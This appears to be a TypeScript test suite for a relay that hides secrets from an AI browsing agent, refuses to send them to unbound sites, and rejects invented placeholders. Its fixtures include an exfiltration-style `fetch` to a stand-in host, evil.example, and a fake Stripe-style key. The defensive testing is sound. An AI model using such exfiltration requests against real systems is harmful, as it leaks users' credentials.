/**
 * relay — the real CdpRelay between a WebSocket agent and a fake Chrome
 * (devtools-relay.md §2, §3, §7): the agent reads a registered secret only
 * as its symbol, a placeholder it types reaches Chrome only for a bound
 * origin (as the isolated-world insert's argument, never as Input.*), the
 * refused commands never reach Chrome, a placeholder the arbiter does not
 * know (or a lookalike of one) never reaches Chrome and the agent is told
 * (typed a key at a time, on the key that closes its code when the code is
 * unknown, so browser-use's step stops before its Submit click), an
 * unreachable
 * arbiter withholds, and every refusal is reported to the arbiter for the
 * agent's model (§3.4) before the agent is answered, names only, a failing
 * report changing nothing (secrets axes, explicit).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { request } from "node:http";
import { stateAxes } from "../axes.js";
import { CdpRelay } from "../../src/relay.js";
import { FakeChrome } from "../fake-chrome.js";
import { MockArbiter } from "../mock-arbiter.js";

stateAxes("secrets");

const KEY = "sk_" + "live_51HxQz8Yv3kT9mN2pL4rB6wE";
const SYM = "$MDU:nomodel_STRIPE_KEY[7f3a]";

interface Rig {
  chrome: FakeChrome;
  relay: CdpRelay;
  arbiter: MockArbiter;
  base: string;
  close(): Promise<void>;
}

async function rig(url: string, bindings: string[] = ["vercel.com"]): Promise<Rig> {
  const chrome = new FakeChrome({ url, pageText: `Secret key ${KEY}`, title: `Keys ${KEY}` });
  await chrome.listen();
  const arbiter = new MockArbiter([{ value: KEY, symbol: SYM, bindings }]);
  const relay = new CdpRelay({ upstream: chrome.url, arbiter, session: "s-relay" });
  const at = await relay.listen();
  return { chrome, relay, arbiter, base: at.url, close: async () => { await relay.close(); await chrome.close(); } };
}

/** A DevTools client: send a command, await its answer; collect events. */
async function agent(wsUrl: string) {
  const ws = new WebSocket(wsUrl);
  await new Promise<void>((resolve, reject) => {
    ws.addEventListener("open", () => resolve(), { once: true });
    ws.addEventListener("error", () => reject(new Error(`no relay at ${wsUrl}`)), { once: true });
  });
  const waiting = new Map<number, (m: any) => void>();
  const events: any[] = [];
  const all: any[] = [];
  ws.addEventListener("message", (ev) => {
    const m = JSON.parse(String(ev.data));
    all.push(m);
    if (typeof m.id === "number") waiting.get(m.id)?.(m);
    else events.push(m);
  });
  let id = 100;
  return {
    events, all,
    send(method: string, params: Record<string, unknown> = {}): Promise<any> {
      const my = id++;
      return new Promise((resolve) => { waiting.set(my, resolve); ws.send(JSON.stringify({ id: my, method, params })); });
    },
    close: () => ws.close(),
  };
}

async function getJson(url: string, host?: string): Promise<{ status: number; body: any }> {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = request({ host: u.hostname, port: u.port, path: u.pathname, headers: host ? { host } : {} }, (res) => {
      let b = "";
      res.on("data", (c) => (b += c));
      res.on("end", () => { let body: any = b; try { body = JSON.parse(b); } catch { /* text */ } resolve({ status: res.statusCode ?? 0, body }); });
    });
    req.on("error", reject);
    req.end();
  });
}

test("discovery points the agent at the relay and masks page titles", async () => {
  const r = await rig("https://dashboard.stripe.com/apikeys");
  try {
    const v = await getJson(`${r.base}/json/version`);
    assert.equal(v.status, 200);
    assert.equal(v.body.webSocketDebuggerUrl, `ws://${new URL(r.base).host}/devtools/browser/B1`);
    const list = await getJson(`${r.base}/json/list`);
    assert.equal(list.body[0].webSocketDebuggerUrl, `ws://${new URL(r.base).host}/devtools/page/PAGE1`);
    assert.equal(list.body[0].devtoolsFrontendUrl, undefined);
    assert.equal(list.body[0].title, `Keys ${SYM}`);
    assert.ok(!JSON.stringify(list.body).includes(KEY));
    assert.equal((await getJson(`${r.base}/json/version`, "evil.example:80")).status, 403, "a non-loopback Host is refused");
    assert.equal((await getJson(`${r.base}/other`)).status, 404);
  } finally {
    await r.close();
  }
});

test("a registered value on the page reaches the agent only as its symbol; Chrome keeps the real one", async () => {
  const r = await rig("https://dashboard.stripe.com/apikeys");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    const ans = await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    assert.equal(ans.id, 100, "the agent's own id comes back");
    assert.equal(ans.result.result.value, `Secret key ${SYM}`);
    // an event, and a credential header in one
    r.chrome.emit("Network.requestWillBeSent", { requestId: "1.1", request: { url: `https://api.stripe.com/v1/x?k=${KEY}`, headers: { Cookie: "sid=abcdef123456" } } });
    r.chrome.emit("Runtime.consoleAPICalled", { type: "log", args: [{ type: "string", value: `logged ${KEY}` }] });
    const ping = await a.send("Runtime.evaluate", { expression: "1" }); // after both events
    assert.ok(ping.result);
    assert.equal(a.events.length, 2);
    assert.equal(a.events[0].params.request.headers.Cookie, "[withheld by Mandu]");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "no raw value in anything the agent got");
    assert.ok(!JSON.stringify(a.all).includes("sid=abcdef123456"), "no cookie");
    assert.ok(JSON.stringify(a.events).includes(SYM));
  } finally {
    a.close();
    await r.close();
  }
});

test("pixels and the cookie jar never reach Chrome", async () => {
  const r = await rig("https://dashboard.stripe.com/apikeys");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    const shot = await a.send("Page.captureScreenshot", { format: "png" });
    assert.match(shot.error.message, /not pixels/);
    const jar = await a.send("Network.getAllCookies");
    assert.match(jar.error.message, /credentials/);
    assert.deepEqual(r.chrome.received.map((m) => m["method"]), [], "Chrome got neither");
  } finally {
    a.close();
    await r.close();
  }
});

test("a body Chrome sends as base64 is withheld", async () => {
  const r = await rig("https://dashboard.stripe.com/apikeys");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    const body = await a.send("Network.getResponseBody", { requestId: "1.1" });
    assert.match(body.error.message, /withheld/);
    const post = await a.send("Network.getRequestPostData", { requestId: "1.1" });
    assert.equal(post.result.postData, `Secret key ${SYM}`, "a text body is masked, not withheld");
  } finally {
    a.close();
    await r.close();
  }
});

test("a placeholder typed into a bound page reaches Chrome only as the insert's argument, and the Enter after it waits", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    const typing = a.send("Input.insertText", { text: SYM });
    const enter = a.send("Input.dispatchKeyEvent", { type: "keyDown", key: "Enter" });
    const [t, e] = await Promise.all([typing, enter]);
    assert.deepEqual(t.result, {});
    assert.deepEqual(e.result, {});
    assert.deepEqual(r.chrome.typed, [KEY], "the page got the real value once");
    const methods = r.chrome.received.map((m) => m["method"]);
    assert.deepEqual(methods, ["Page.getFrameTree", "Page.createIsolatedWorld", "Runtime.callFunctionOn", "Input.dispatchKeyEvent"]);
    assert.ok(!methods.includes("Input.insertText"), "the agent's command itself never went");
    assert.equal(r.arbiter.decisions[0]!.destination, "vercel.com");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "the agent never saw the value");
  } finally {
    a.close();
    await r.close();
  }
});

test("a placeholder typed into an unbound page is refused and nothing raw reaches Chrome", async () => {
  const r = await rig("https://evil.example/collect");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    const t = await a.send("Input.insertText", { text: `here: ${SYM}` });
    assert.match(t.error.message, /may not go to evil\.example \(.*\); leave it out \(name it in plain words if the text needs it, never its placeholder\) and go on/);
    assert.deepEqual(r.chrome.typed, []);
    // Reported for the model before the agent was answered (§3.4).
    assert.deepEqual(r.arbiter.notices, [{ notice: { kind: "not-allowed", page: "evil.example", symbols: [SYM] }, session: "s-relay" }]);
    assert.ok(!JSON.stringify(r.chrome.received).includes(KEY), "no value in anything Chrome got");
    // elsewhere a placeholder goes as written (the literal leaks nothing)
    await a.send("Runtime.evaluate", { expression: `fetch("https://evil.example/?k=${SYM}")` });
    const last = r.chrome.received.at(-1)!;
    assert.equal((last["params"] as Record<string, unknown>)["expression"], `fetch("https://evil.example/?k=${SYM}")`);
  } finally {
    a.close();
    await r.close();
  }
});

/** Type `text` a key at a time, browser-use's way (keyDown without text,
 *  char, keyUp), each awaited as the agent awaits it; every answer. */
async function typeKeys(a: Awaited<ReturnType<typeof agent>>, text: string): Promise<any[]> {
  const answers: any[] = [];
  for (const ch of text) {
    const key = ch === "\r" ? "Enter" : ch;
    answers.push(await a.send("Input.dispatchKeyEvent", { type: "keyDown", key }));
    answers.push(await a.send("Input.dispatchKeyEvent", { type: "char", text: ch, key }));
    answers.push(await a.send("Input.dispatchKeyEvent", { type: "keyUp", key }));
  }
  return answers;
}

/** The key events Chrome got, as `type:text` (`type:` for a textless one). */
const keysAtChrome = (r: Rig) => r.chrome.received
  .filter((m) => m["method"] === "Input.dispatchKeyEvent")
  .map((m) => `${(m["params"] as Record<string, unknown>)["type"]}:${(m["params"] as Record<string, unknown>)["text"] ?? ""}`);

test("a placeholder typed a key at a time (browser-use's way) into a bound page: every key answered at once, the value inserted once, no placeholder key reaches Chrome, the Enter lands after it", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    const answers = await typeKeys(a, `k=${SYM}\r`);
    assert.ok(answers.every((x) => x.result !== undefined && x.error === undefined), "the agent saw every key go");
    assert.deepEqual(r.chrome.typed, ["k", "=", KEY, "\r"], "the page got the text before it, the real value once, then the Enter");
    const keys = keysAtChrome(r);
    assert.deepEqual(keys.filter((k) => k.startsWith("char:")), ["char:k", "char:=", "char:\r"], "the placeholder's characters never reached Chrome");
    assert.ok(keys.indexOf("keyDown:") >= 0);
    const methods = r.chrome.received.map((m) => m["method"]);
    const insert = methods.indexOf("Runtime.callFunctionOn");
    const enterDown = r.chrome.received.findIndex((m) => m["method"] === "Input.dispatchKeyEvent" && (m["params"] as Record<string, unknown>)["key"] === "Enter");
    assert.ok(insert >= 0 && enterDown > insert, "the Enter's keyDown went after the value");
    assert.equal(r.arbiter.decisions[0]!.destination, "vercel.com");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "the agent never saw the value");
    await new Promise((res) => setTimeout(res, 30));
    assert.deepEqual(r.arbiter.events.filter((e) => e["action"] === "released").map((e) => [e["method"], e["page"], e["symbols"]]),
      [["Input.dispatchKeyEvent", "vercel.com", [SYM]]]);
  } finally {
    a.close();
    await r.close();
  }
});

test("a placeholder typed a key at a time into an unbound page: refused, nothing typed, nothing raw reaches Chrome; ordinary text with a $ is forwarded as typed", async () => {
  const r = await rig("https://evil.example/collect");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    await typeKeys(a, SYM);
    await a.send("Runtime.evaluate", { expression: "1" }); // another command ends the run
    assert.deepEqual(r.chrome.typed, []);
    assert.deepEqual(keysAtChrome(r).filter((k) => k.startsWith("char:")), [], "not one of its characters was typed");
    assert.ok(!JSON.stringify(r.chrome.received).includes(KEY), "no value in anything Chrome got");
    await new Promise((res) => setTimeout(res, 30));
    assert.deepEqual(r.arbiter.events.filter((e) => e["action"] === "refused").map((e) => e["method"]), ["Input.dispatchKeyEvent"]);
    // The keys were answered as they came: the agent's next input command
    // carries the refusal, and is not sent (§3.3).
    const told = await a.send("Input.dispatchMouseEvent", { type: "mousePressed", x: 1, y: 1, button: "left", clickCount: 1 });
    assert.match(String(told.error?.message), /may not go to evil\.example.*this command was not sent either/);
    assert.ok(!r.chrome.received.some((m) => m["method"] === "Input.dispatchMouseEvent"), "the click never reached Chrome");
    await typeKeys(a, "costs $5!");
    assert.deepEqual(keysAtChrome(r).filter((k) => k.startsWith("char:")).join("").replaceAll("char:", ""), "costs $5!", "a $ that is not a placeholder is typed as it was, in order");
  } finally {
    a.close();
    await r.close();
  }
});

test("a placeholder typed a key at a time and then nothing: released when the agent goes quiet", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    await typeKeys(a, SYM);
    assert.deepEqual(r.chrome.typed, [], "held while it could still grow");
    await new Promise((res) => setTimeout(res, 700));
    assert.deepEqual(r.chrome.typed, [KEY]);
  } finally {
    a.close();
    await r.close();
  }
});

/** A placeholder no arbiter minted: the live demos' near-miss, one hash
 *  digit off the one the page showed (devtools-relay.md §3.2). */
const MADE_UP = "$MDU:nomodel_STRIPE_KEY[7f3b]";

/** Nothing of `token` reached Chrome: no command carried it, and no key
 *  typed its characters. */
function noneAtChrome(r: Rig, token: string): void {
  assert.ok(!JSON.stringify(r.chrome.received).includes(token), "no command Chrome got carried it");
  assert.equal(keysAtChrome(r).filter((k) => k.startsWith("char:")).map((k) => k.slice(5)).join("").includes("MDU"), false, "none of its characters were typed");
  assert.deepEqual(r.chrome.typed.filter((t) => t.includes("MDU") || t === KEY), [], "the page got neither the literal nor a value");
}

test("a placeholder the arbiter does not know, inserted whole: refused, never reaches Chrome, and the agent is told to type it as the page shows it, with the one the page showed", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    // The agent reads the page first: the relay remembers the placeholder it showed.
    const read = await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    assert.equal(read.result.result.value, `Secret key ${SYM}`);
    const t = await a.send("Input.insertText", { text: `STRIPE_KEY=${MADE_UP}` });
    assert.equal(t.result, undefined, "not answered as done");
    assert.match(String(t.error?.message), /no such placeholder \$MDU:nomodel_STRIPE_KEY\[7f3b\]: type the placeholder exactly as the page shows it/);
    assert.ok(String(t.error?.message).includes(`the pages showed ${SYM}`), t.error?.message);
    assert.ok(!r.chrome.received.some((m) => m["method"] === "Input.insertText" || m["method"] === "Runtime.callFunctionOn"), "no insert of any kind");
    noneAtChrome(r, MADE_UP);
    // The known one, typed as shown, still goes in (unchanged).
    assert.deepEqual((await a.send("Input.insertText", { text: SYM })).result, {});
    assert.deepEqual(r.chrome.typed, [KEY]);
    await new Promise((res) => setTimeout(res, 30));
    const typing = r.arbiter.events.filter((e) => e["action"] === "refused" || e["action"] === "released").map((e) => [e["action"], e["reason"], e["unknown"]]);
    assert.deepEqual(typing, [["refused", "unknown placeholder", [MADE_UP]], ["released", undefined, undefined]], "traced refused (unknown placeholder), never released");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "the agent never saw the value");
    assert.deepEqual(r.arbiter.notices, [{ notice: { kind: "unknown", page: "vercel.com", symbols: [MADE_UP], shown: [SYM] }, session: "s-relay" }], "reported for the model once, names only");
  } finally {
    a.close();
    await r.close();
  }
});

test("a placeholder whose code the arbiter does not know, typed a key at a time: the key that closes its code carries the error, none of its keys reach Chrome, and the next input command is not told again", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    const made = `${MADE_UP}.text`;
    const keys = await typeKeys(a, made);
    const errors = keys.flatMap((x, i) => (x.error !== undefined ? [i] : []));
    assert.deepEqual(errors, [MADE_UP.length * 3 - 2], "only the ]'s char event, the key that closes the code, is answered with the error");
    const told = String(keys[errors[0]!].error.message);
    assert.match(told, /no such placeholder \$MDU:nomodel_STRIPE_KEY\[7f3b\]: type the placeholder exactly as the page shows it.*the pages showed \$MDU:nomodel_STRIPE_KEY\[7f3a\]/);
    assert.deepEqual(r.arbiter.looked, [MADE_UP], "the arbiter asked about the base once, on that key");
    // browser-use's framework events and read-back, then its click on Save.
    assert.equal((await a.send("Runtime.callFunctionOn", { functionDeclaration: "function () { return 1; }", objectId: "o1" })).error, undefined);
    noneAtChrome(r, MADE_UP);
    assert.deepEqual(keysAtChrome(r).filter((k) => k.startsWith("char:")), [], "not one of its characters, nor the .text typed after the refusal");
    const click = await a.send("Input.dispatchMouseEvent", { type: "mousePressed", x: 1, y: 1, button: "left", clickCount: 1 });
    assert.equal(click.error, undefined, "told on its key: the click is not refused again");
    await new Promise((res) => setTimeout(res, 30));
    const refused = r.arbiter.events.filter((e) => e["action"] === "refused");
    assert.deepEqual(refused.map((e) => [e["method"], e["reason"], e["unknown"]]), [["Input.dispatchKeyEvent", "unknown placeholder", [MADE_UP]]]);
    assert.equal(r.arbiter.events.filter((e) => e["action"] === "released").length, 0, "never traced released");
    assert.deepEqual(r.arbiter.notices, [{ notice: { kind: "unknown", page: "vercel.com", symbols: [MADE_UP], shown: [SYM] }, session: "s-relay" }], "reported once, before the key was answered");
    assert.deepEqual([r.arbiter.decisions.length, r.arbiter.resolved.length], [0, 0], "the gate and the values were never asked");
    // The one the page showed, typed the same way, goes in.
    const ok = await typeKeys(a, SYM);
    assert.ok(ok.every((x) => x.error === undefined));
    await a.send("Runtime.evaluate", { expression: "1" });
    assert.deepEqual(r.chrome.typed, [KEY]);
    assert.ok(!JSON.stringify(a.all).includes(KEY), "the agent never saw the value");
  } finally {
    a.close();
    await r.close();
  }
});

test("a known placeholder with a field the secret lacks, typed a key at a time: decided at the run's end, none of its keys reach Chrome, and the agent's next input command carries the error (the field needs the whole name, §3.3)", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  const bogus = `${SYM}.bogus`;
  try {
    await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    // Ended by another command (browser-use's framework events, then its read-back): both go.
    const answers = await typeKeys(a, bogus);
    assert.ok(answers.every((x) => x.error === undefined), "each key was answered as it came: its base is known");
    const after = await a.send("Runtime.callFunctionOn", { functionDeclaration: "function () { return 1; }", objectId: "o1" });
    assert.equal(after.error, undefined, "a command that types nothing is not the one told");
    noneAtChrome(r, bogus);
    // The agent's next input command (its click on Save) is refused with it.
    const click = await a.send("Input.dispatchMouseEvent", { type: "mousePressed", x: 1, y: 1, button: "left", clickCount: 1 });
    assert.ok(String(click.error?.message).includes(`no such placeholder ${bogus}: type the placeholder exactly as the page shows it`), click.error?.message);
    assert.ok(String(click.error?.message).includes(`the pages showed ${SYM}`));
    assert.ok(!r.chrome.received.some((m) => m["method"] === "Input.dispatchMouseEvent"), "the click was not sent");
    const again = await a.send("Input.dispatchMouseEvent", { type: "mouseReleased", x: 1, y: 1, button: "left", clickCount: 1 });
    assert.equal(again.error, undefined, "told once");

    // Ended by a key that cannot extend it: that key carries the error.
    const keys = await typeKeys(a, `${bogus} `);
    const firstError = keys.findIndex((x) => x.error !== undefined);
    assert.equal(firstError, bogus.length * 3 + 1, "the space's char is answered with the error");
    assert.match(String(keys[firstError].error.message), /no such placeholder/);
    assert.ok(keys.slice(firstError + 1).every((x) => x.error === undefined), "only once");
    noneAtChrome(r, bogus);

    // Ended by quiet: the next input command carries it.
    await typeKeys(a, bogus);
    await new Promise((res) => setTimeout(res, 700));
    const insert = await a.send("Input.insertText", { text: SYM });
    assert.match(String(insert.error?.message), /no such placeholder/);
    noneAtChrome(r, bogus);
    assert.deepEqual(r.chrome.typed.filter((t) => t === KEY), [], "the insert that carried the error was not released either");
    await new Promise((res) => setTimeout(res, 30));
    const refused = r.arbiter.events.filter((e) => e["action"] === "refused");
    assert.equal(refused.length, 3);
    assert.ok(refused.every((e) => e["reason"] === "unknown placeholder" && JSON.stringify(e["unknown"]) === JSON.stringify([bogus])));
    assert.equal(r.arbiter.events.filter((e) => e["action"] === "released").length, 0, "never traced released");
    // Each run's refusal reached the arbiter when the run ended, before the
    // agent's next input command was told (the model hears of it either way).
    assert.equal(r.arbiter.notices.length, 3);
    assert.ok(r.arbiter.notices.every((n) => n.notice.kind === "unknown" && n.notice.symbols[0] === bogus && n.notice.shown?.[0] === SYM));
    assert.ok(!JSON.stringify(r.arbiter.notices).includes(KEY));
    assert.deepEqual(r.arbiter.looked, [SYM, SYM, SYM], "each run's base checked, and known");
  } finally {
    a.close();
    await r.close();
  }
});

test("a placeholder-shaped token in ordinary prose is refused too (nothing raw either way; the model is told)", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    const t = await a.send("Input.insertText", { text: `Mandu writes secrets as ${MADE_UP} in what the agent reads.` });
    assert.match(String(t.error?.message), /no such placeholder/);
    assert.doesNotMatch(String(t.error?.message), /pages showed/, "nothing shown yet, nothing named");
    assert.deepEqual(r.chrome.typed, []);
    const plain = await a.send("Input.insertText", { text: "costs $5, see $MDU docs" });
    assert.deepEqual(plain.result, {}, "text with no whole placeholder is forwarded as it was");
    assert.deepEqual(r.chrome.typed, ["costs $5, see $MDU docs"]);
  } finally {
    a.close();
    await r.close();
  }
});

/** A placeholder LOOKALIKE: the live expense-report demo's model made up a
 *  UUID for the code (devtools-relay.md §3.2, *A placeholder lookalike*). */
const UUID_LOOKALIKE = "$MDU:nomodel_STRIPE_KEY[e213b2c2-8419-4809-b684-297d264f3319].number";
/** The lookalike as far as the key that closes its code: what a key run is
 *  refused on (typing.ts `decide`, devtools-relay.md §3.3). */
const CLOSED = UUID_LOOKALIKE.slice(0, UUID_LOOKALIKE.indexOf("]") + 1);

test("a lookalike (a UUID for the code), inserted whole or typed a key at a time: never reaches Chrome, the agent is told with the one the page showed, the trace says refused, the notice reported once without quoting it", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    // Whole.
    const t = await a.send("Input.insertText", { text: UUID_LOOKALIKE });
    assert.equal(t.result, undefined, "not answered as done");
    assert.ok(String(t.error?.message).includes(`no such placeholder ${UUID_LOOKALIKE}: type the placeholder exactly as the page shows it`), t.error?.message);
    assert.ok(String(t.error?.message).includes(`the pages showed ${SYM}`), t.error?.message);
    noneAtChrome(r, UUID_LOOKALIKE);
    assert.equal(r.arbiter.decisions.length + r.arbiter.resolved.length, 0, "the arbiter was not asked: a lookalike names nothing");
    assert.deepEqual(r.arbiter.notices, [{ notice: { kind: "malformed", page: "vercel.com", symbols: [], shown: [SYM] }, session: "s-relay" }], "reported once, before the answer, never quoting the lookalike");

    // A key at a time (browser-use's way): the key that closes its code carries the error
    // (an agent that types on regardless: the rest of it is dropped, the space after it goes).
    const keys = await typeKeys(a, `${UUID_LOOKALIKE} `);
    const firstError = keys.findIndex((x) => x.error !== undefined);
    assert.equal(firstError, UUID_LOOKALIKE.indexOf("]") * 3 + 1, "every key answered as it came until the ]'s char, which is told");
    assert.ok(String(keys[firstError].error.message).includes(`no such placeholder ${CLOSED}`), keys[firstError].error.message);
    assert.ok(keys.slice(firstError + 1).every((x) => x.error === undefined), "told once");
    noneAtChrome(r, UUID_LOOKALIKE);
    assert.deepEqual(keysAtChrome(r).filter((k) => k.startsWith("char:")), ["char: "], "of all it typed, only the space after it reached the page");
    assert.equal(r.arbiter.notices.length, 2, "the run's refusal reported once more");
    assert.deepEqual(r.arbiter.notices[1]!.notice, { kind: "malformed", page: "vercel.com", symbols: [], shown: [SYM] });
    const click = await a.send("Input.dispatchMouseEvent", { type: "mousePressed", x: 1, y: 1, button: "left", clickCount: 1 });
    assert.equal(click.error, undefined, "the next input command is not told again");

    await new Promise((res) => setTimeout(res, 30));
    const refused = r.arbiter.events.filter((e) => e["action"] === "refused");
    assert.deepEqual(refused.map((e) => [e["method"], e["reason"], e["unknown"]]), [
      ["Input.insertText", "unknown placeholder", [UUID_LOOKALIKE]],
      ["Input.dispatchKeyEvent", "unknown placeholder", [CLOSED]],
    ]);
    assert.equal(r.arbiter.events.filter((e) => e["action"] === "released").length, 0, "never traced released");

    // The placeholder as the page shows it still goes in; prose with $MDU is typed as written.
    assert.deepEqual((await a.send("Input.insertText", { text: SYM })).result, {});
    assert.deepEqual(r.chrome.typed, [" ", KEY], "the space typed after the lookalike, then the real value");
    await typeKeys(a, "see $MDU docs, $MDU:foo or $MDU:k[ab cd]");
    assert.equal(keysAtChrome(r).filter((k) => k.startsWith("char:")).map((k) => k.slice(5)).join(""), " see $MDU docs, $MDU:foo or $MDU:k[ab cd]", "every key forwarded, in order (after the space typed above)");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "the agent never saw the value");
  } finally {
    a.close();
    await r.close();
  }
});

/** browser-use's `input` action as it runs through the relay: focus and
 *  clear, its keys, its framework events and read-back; then, when a key
 *  failed, its fallback (a click on the field, the text typed to the page
 *  again). Resolves with whether the action failed, as browser-use's own
 *  `except` sees it. */
async function browserUseInput(a: Awaited<ReturnType<typeof agent>>, text: string): Promise<{ failed: boolean; message: string }> {
  const keysOf = async (): Promise<string | null> => {
    for (const x of await typeKeysUntilError(a, text)) if (x.error !== undefined) return String(x.error.message);
    return null;
  };
  const first = await keysOf();
  if (first === null) {
    await a.send("Runtime.callFunctionOn", { functionDeclaration: "function () { this.dispatchEvent(new Event('input')); }", objectId: "field" });
    await a.send("Runtime.callFunctionOn", { functionDeclaration: "function () { return this.value; }", objectId: "field", returnByValue: true });
    return { failed: false, message: "" };
  }
  // The fallback: a click on the field, then the text typed to the page.
  await a.send("Input.dispatchMouseEvent", { type: "mousePressed", x: 5, y: 5, button: "left", clickCount: 1 });
  await a.send("Input.dispatchMouseEvent", { type: "mouseReleased", x: 5, y: 5, button: "left", clickCount: 1 });
  const again = await keysOf();
  return { failed: again !== null, message: again ?? first };
}

/** Type `text` browser-use's way, stopping at the first key answered with an
 *  error (its typing loop raises there). */
async function typeKeysUntilError(a: Awaited<ReturnType<typeof agent>>, text: string): Promise<any[]> {
  const answers: any[] = [];
  for (const ch of text) {
    for (const params of [{ type: "keyDown", key: ch }, { type: "char", text: ch, key: ch }, { type: "keyUp", key: ch }]) {
      const x = await a.send("Input.dispatchKeyEvent", params);
      answers.push(x);
      if (x.error !== undefined) return answers;
    }
  }
  return answers;
}

test("the live expense-report failure, replayed: a made-up placeholder (a UUID for its code) fails browser-use's input action itself, so its next action (the submit click) never runs on a half-filled form; nothing of it reaches the page; the model is told the one the page showed", async () => {
  // Live 2026-10-19 (the expense-report demo, Gemini 2.5 Flash): the model typed
  // `$MDU:nomodel_Read[6a91724a-…].content` into the card field and clicked
  // Submit in the same step. The refusal was told on the click's first mouse
  // event; browser-use fell back to a script click and filed the expense
  // without the card. Now the ] that closes the made-up code is refused.
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    const made = "$MDU:nomodel_STRIPE_KEY[6a91724a-25c2-4824-91b4-5c962b146473].content";
    const input = await browserUseInput(a, made);
    assert.equal(input.failed, true, "the input action failed: browser-use stops the step's actions here (multi_act breaks on an error)");
    assert.ok(input.message.includes(`no such placeholder ${made.slice(0, made.indexOf("]") + 1)}`), input.message);
    assert.ok(input.message.includes(`the pages showed ${SYM}`), "the error names the placeholder the page showed");
    noneAtChrome(r, made);
    assert.deepEqual(keysAtChrome(r).filter((k) => k.startsWith("char:")), [], "not one character of it reached the page");
    assert.ok(r.arbiter.notices.length >= 1 && r.arbiter.notices.every((n) => n.notice.kind === "malformed" && n.notice.symbols.length === 0 && n.notice.shown?.[0] === SYM),
      "reported for the model's next call, names only, never quoting the made-up code");
    // The model's next try, the placeholder as the page shows it: released (the page is bound).
    const ok = await browserUseInput(a, SYM);
    assert.equal(ok.failed, false);
    assert.deepEqual(r.chrome.typed, [KEY], "the real value, once");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "the agent never saw the value");
  } finally {
    a.close();
    await r.close();
  }
});

/** One browser-use step of two actions, as its `multi_act` runs them: the
 *  `input` (above), and, only when it did not fail, a `click` on Submit: its
 *  mouse events, and on an error the fallback browser-use takes for a
 *  failed mouse event, a script click on the element (`element.click()`,
 *  default_action_watchdog.py). Resolves with whether the input failed and
 *  whether Submit was clicked. */
async function browserUseStep(a: Awaited<ReturnType<typeof agent>>, text: string): Promise<{ inputFailed: boolean; message: string; submitted: boolean }> {
  const input = await browserUseInput(a, text);
  if (input.failed) return { inputFailed: true, message: input.message, submitted: false };
  const press = await a.send("Input.dispatchMouseEvent", { type: "mousePressed", x: 40, y: 90, button: "left", clickCount: 1 });
  const lift = press.error === undefined ? await a.send("Input.dispatchMouseEvent", { type: "mouseReleased", x: 40, y: 90, button: "left", clickCount: 1 }) : press;
  if (press.error !== undefined || lift.error !== undefined) {
    await a.send("Runtime.callFunctionOn", { functionDeclaration: SCRIPT_CLICK, objectId: "submit" });
  }
  return { inputFailed: false, message: String(press.error?.message ?? ""), submitted: true };
}

/** browser-use's fallback click, by script. */
const SCRIPT_CLICK = "function () { this.click(); }";

/** Whether Submit was clicked at Chrome (a mouse press, or the script click),
 *  and how much the page had been typed by then. */
function submitsAtChrome(r: Rig): Array<{ typedBefore: string[] }> {
  const out: Array<{ typedBefore: string[] }> = [];
  let typed = 0;
  for (const m of r.chrome.received) {
    const p = (m["params"] ?? {}) as Record<string, unknown>;
    if (m["method"] === "Runtime.callFunctionOn" && p["executionContextId"] === 77) typed++; // the relay's insert
    // Submit's own press (at 40,90; the input's fallback clicks the field at 5,5).
    if ((m["method"] === "Input.dispatchMouseEvent" && p["type"] === "mousePressed" && p["x"] === 40) || (m["method"] === "Runtime.callFunctionOn" && p["functionDeclaration"] === SCRIPT_CLICK)) {
      out.push({ typedBefore: r.chrome.typed.slice(0, typed) });
    }
  }
  return out;
}

test("the expense-report step with a made-up HEX placeholder, replayed as browser-use runs it (its input, its fallback typing, then its Submit click with the script-click fallback): Submit never fires with the field empty; the model's next step with the page's placeholder fills it, then submits", async () => {
  // Live 2026-10-19 (the expense-report demo, Gemini 2.5 Flash): the model
  // typed `$MDU:web_fetch[8c4f].text`, a well-formed placeholder no row has,
  // and clicked Submit in the same step. Before, the run was refused when it
  // ended, the refusal rode the click's first mouse event, browser-use
  // clicked by script and the expense went out with the card field empty.
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
